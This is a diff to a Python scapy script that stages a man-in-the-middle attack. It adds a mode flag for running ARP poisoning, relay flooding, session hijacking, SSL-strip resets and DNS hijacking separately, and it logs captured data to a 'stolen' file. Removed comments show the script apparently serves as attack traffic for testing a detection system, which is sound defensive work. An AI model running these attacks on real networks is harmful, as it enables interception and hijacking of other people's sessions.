@@ -32,6 +32,11 @@ from scapy.all import *
 VICTIM_IP = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
 SERVER_IP = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.2"
 IFACE     = sys.argv[3] if len(sys.argv) > 3 else None
+# --mode flag: "all" (default), "arp", "ssl", "session", "dns"
+MODE      = "all"
+for a in sys.argv:
+    if a.startswith("--mode="):
+        MODE = a.split("=", 1)[1]
 STOLEN    = "/tmp/mitm_stolen.txt"
 
 DNS_SPOOF_DOMAIN = b"\x04test\x05local\x00"   # test.local
@@ -364,35 +369,48 @@ def relay_and_intercept(pkt):
 
 
 # ── Launch ──────────────────────────────────────────────
-print("\n" + "="*55)
-print("🔴 MITM ATTACK STARTING  (honest detection target)")
-print("="*55)
+print(f"\n{'='*55}")
+print(f"MITM ATTACK STARTING  (mode={MODE})")
+print(f"{'='*55}")
 
-# Phase 1: ARP poisoning first — registers the conflict
-threading.Thread(target=arp_poison_loop, args=(VICTIM_IP, SERVER_IP), daemon=True).start()
-threading.Thread(target=arp_poison_loop, args=(SERVER_IP, VICTIM_IP), daemon=True).start()
+run_arp     = MODE in ("all", "arp")
+run_relay   = MODE in ("all", "arp")        # relay is part of ARP attack
+run_session = MODE in ("all", "session")
+run_ssl     = MODE in ("all", "ssl")
+run_dns     = MODE in ("all", "dns")
 
-# Phase 2: Wait for ARP to propagate, then start relay traffic
-# The 5s delay ensures the controller has registered the ARP conflict
-# before relay flows appear, so _scan_flows_for_arp_suspect finds real traffic.
-print("⏳ Waiting 5s for ARP conflict to register before relay traffic …")
-time.sleep(5)
+if run_arp:
+    threading.Thread(target=arp_poison_loop, args=(VICTIM_IP, SERVER_IP), daemon=True).start()
+    threading.Thread(target=arp_poison_loop, args=(SERVER_IP, VICTIM_IP), daemon=True).start()
+    print("ARP Poisoning   : active")
 
-threading.Thread(target=relay_flood,        daemon=True).start()
-threading.Thread(target=session_hijack_loop, daemon=True).start()
-threading.Thread(target=ssl_strip_loop,      daemon=True).start()
-threading.Thread(target=dns_hijack_loop,     daemon=True).start()
+if run_relay or run_session or run_ssl:
+    print("Waiting 5s for ARP conflict to register ...")
+    time.sleep(5)
 
-print("✅ ARP Poisoning   : active  (→ ML + rule-based ARP detection)")
-print("✅ Relay Flood     : active  (→ ML flow anomaly at 5/10/15/… pkts)")
-print("✅ Session Hijack  : active  (→ RST ratio + ML)")
-print("✅ SSL Strip RST   : active  (→ port 443 + RST ratio)")
-print("✅ DNS Hijacking   : active  (→ rule-based divergence)")
-print(f"✅ Logging to      : {STOLEN}")
+if run_relay:
+    threading.Thread(target=relay_flood, daemon=True).start()
+    print("Relay Flood     : active")
+if run_session:
+    threading.Thread(target=session_hijack_loop, daemon=True).start()
+    print("Session Hijack  : active")
+if run_ssl:
+    threading.Thread(target=ssl_strip_loop, daemon=True).start()
+    print("SSL Strip RST   : active")
+if run_dns:
+    threading.Thread(target=dns_hijack_loop, daemon=True).start()
+    print("DNS Hijacking   : active")
 
-sniff(
-    filter=f"ip host {VICTIM_IP} or ip host {SERVER_IP}",
-    prn=relay_and_intercept,
-    iface=IFACE,
-    store=False,
-)
+print(f"Logging to      : {STOLEN}")
+
+if run_arp or run_relay:
+    sniff(
+        filter=f"ip host {VICTIM_IP} or ip host {SERVER_IP}",
+        prn=relay_and_intercept,
+        iface=IFACE,
+        store=False,
+    )
+else:
+    # No sniff needed for DNS-only — just keep alive
+    while True:
+        time.sleep(1)
